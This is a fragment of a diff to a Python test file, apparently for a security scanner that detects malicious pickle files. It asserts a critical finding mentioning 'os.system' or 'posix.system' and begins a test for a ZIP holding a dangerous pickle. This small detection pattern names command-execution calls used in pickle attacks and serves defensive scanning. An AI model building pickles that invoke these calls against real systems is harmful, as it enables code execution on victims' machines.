+            issue.severity == IssueSeverity.CRITICAL
+            and any(symbol in issue.message.lower() for symbol in ("os.system", "posix.system"))
+            for issue in result.issues
+        )
+        assert core.determine_exit_code(result) == 1
 
     def test_scan_zip_with_dangerous_pickle(self):
         """Test scanning a ZIP file containing a dangerous pickle"""
